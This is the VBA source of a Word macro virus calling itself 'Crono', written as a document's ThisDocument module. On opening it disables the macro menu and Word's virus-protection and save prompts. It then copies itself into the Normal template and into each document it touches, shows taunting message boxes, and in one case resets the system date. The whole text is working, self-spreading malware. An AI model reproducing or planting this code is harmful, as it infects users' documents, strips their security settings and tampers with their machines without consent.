   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   On Error Resume Next
   CommandBars("Tools").Controls("Macro").Enabled = False
   Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
   LDA = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   LPG = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If Not ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("VFxD%:&-/", 1, 1, 1000, 1000, True) Then
   If LDA > 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LDA
   INDA = True
   End If
   If Not NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("VFxD%:&-/", 1, 1, 1000, 1000, True) Then
   If LPG > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LPG
   INPG = True
   ActiveDocument.Saved = True
   End If
   If INPG <> True And INDA <> True Then GoTo IRA
   ' & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
   If INPG = True Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LDA))
   If INDA = True Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LPG))
   IRA:
   If LPG <> 0 And LDA = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
   ActiveDocument.Saved = True
   End If
   ff = Format(Date, "ddmyyyy")
   d = Day(Now)
   m = Month(Now)
   y = Year(Now)
   f2 = d & m & y
   If ff > f2 Then
       Randomize
       Select Case Int(15 * Rnd) + 1
       Case Is = 1: MsgBox ("Message by Crono:" & vbCrLf & "I don't like this document")
       Case Is = 2: MsgBox ("Message by Crono:" & vbCrLf & "This document is a shit")
       Case Is = 3: MsgBox ("Message by Crono:" & vbCrLf & "You are in my domain")
       Case Is = 4: MsgBox ("Message by Crono:" & vbCrLf & "Close the application, today I'm very hungry!")
       Case Is = 5: MsgBox ("Message by Crono:" & vbCrLf & "Be carefull, I'm still stay here")
       Case Is = 6: MsgBox ("Message by Crono:" & vbCrLf & "Oh! Oh! Microsoft fall")
       Case Is = 7: MsgBox ("Message by Crono:" & vbCrLf & "Kernel32.dll was infected")
       Case Is = 8: MsgBox ("Message by Crono:" & vbCrLf & "The grammar have been disabled")
       Case Is = 9: MsgBox ("Message by Crono:" & vbCrLf & "You can't do nothing but Crono can")
       Case Is = 10: MsgBox ("Message by Crono:" & vbCrLf & "Talk about me and you will be free")
       Case Is = 11: MsgBox ("Message by Crono:" & vbCrLf & "I can feel your fear!")
       Case Is = 12: MsgBox ("Message by Crono:" & vbCrLf & "I'm sending your data to all world")
       Case Is = 13: MsgBox ("Message by Crono:" & vbCrLf & "Smile with me! :-)  ;-(  :-O")
       Case Is = 14: MsgBox ("Message by Crono:" & vbCrLf & "Inspired in MelissaWordMacroVirus")
       Case Is = 15: MsgBox ("Message by Crono:" & vbCrLf & "I change your Date to 01/01/1875"): Date = "01/01/1875"
       End Select
   End If
   End Sub
